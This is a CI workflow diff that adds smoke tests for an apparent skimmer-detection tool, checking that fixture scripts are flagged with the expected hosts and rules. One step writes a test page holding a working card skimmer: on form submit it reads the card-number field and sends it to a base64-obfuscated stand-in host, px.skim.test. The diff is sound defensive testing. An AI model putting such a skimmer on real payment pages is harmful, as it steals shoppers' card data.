@@ -65,6 +65,20 @@ jobs:
       - name: Build
         run: uv build
 
+      - name: Smoke test the skimmer heuristics on the synthetic corpus
+        run: |
+          # A card skimmer fails the gate; the PSP library posting to its own host doesn't.
+          set +e
+          .venv/bin/sentinel inspect tests/fixtures/heuristics/malicious/card_beacon.js \
+            --fail-on high > /dev/null
+          test $? -eq 5
+          set -e
+          .venv/bin/sentinel inspect tests/fixtures/heuristics/benign/psp_elements.js \
+            --script-host pay.vendor.test --fail-on low
+          .venv/bin/sentinel inspect tests/fixtures/heuristics/malicious/loader.js --json \
+            | jq -e '.hidden_hosts == ["loader.skim.test"]
+                     and (.verdicts | map(.rule) | index("inject.hidden_source") != null)'
+
       - name: Smoke test the CLI and API against PostgreSQL
         env:
           SENTINEL_DATABASE_URL: ${{ env.SENTINEL_TEST_DATABASE_URL }}
@@ -175,7 +189,8 @@ jobs:
           .venv/bin/sentinel findings show "$finding" --json \
             | jq -e '.detail.hosts_added == ["collect.skim.test"]
                      and .detail.urls_added == ["https://collect.skim.test/c"]
-                     and (.detail.hunks[0].added | startswith("navigator . sendBeacon"))'
+                     and (.detail.hunks[0].added | startswith("navigator . sendBeacon"))
+                     and (.detail.verdicts | map(.rule)) == ["exfil.stored_data"]'
           .venv/bin/sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --json \
             | jq -e '.hosts_added == ["collect.skim.test"] and .tokens.removed == 0'
           # Handling it is audited; resolving needs a note.
@@ -193,6 +208,25 @@ jobs:
           .venv/bin/sentinel scan run demo --json > "$scan"
           jq -e '[.findings[] | .kind] == ["script.added"]
                  and (.findings[0].locator | endswith("/checkout.html#inline-3"))' "$scan"
+          # A page that already runs a skimmer when monitoring starts: its first scan is
+          # the baseline, but the skimmer is reported instead of becoming part of it.
+          printf '%s\n' '<script>' \
+            'document.addEventListener("submit", function () {' \
+            '  var v = document.querySelector("#cc-number").value;' \
+            '  new Image().src = atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v=" + v;' \
+            '});' '</script>' > examples/fixture-site/promo.html
+          .venv/bin/sentinel pages add demo http://127.0.0.1:8000/promo.html --payment
+          .venv/bin/sentinel scan run demo --json > "$scan"
+          jq -e '[.findings[] | .kind] == ["script.suspicious"]
+                 and .findings[0].severity == "critical"' "$scan"
+          finding=$(jq -r '.findings[0].id' "$scan")
+          .venv/bin/sentinel findings show "$finding" --json \
+            | jq -e '.detail.hidden_hosts == ["px.skim.test"]
+                     and (.detail.verdicts | map(.rule) | index("skimmer.card_data") != null)'
+          .venv/bin/sentinel scripts inspect demo http://127.0.0.1:8000/promo.html#inline-1 --json \
+            | jq -e '.worst == "high" and .context.site_hosts == ["127.0.0.1"]'
+          rm examples/fixture-site/promo.html
+          .venv/bin/sentinel pages remove demo http://127.0.0.1:8000/promo.html
           git checkout -- examples
           # A page that fails makes `scan run` exit 3.
           .venv/bin/sentinel pages add demo http://127.0.0.1:8000/missing.html
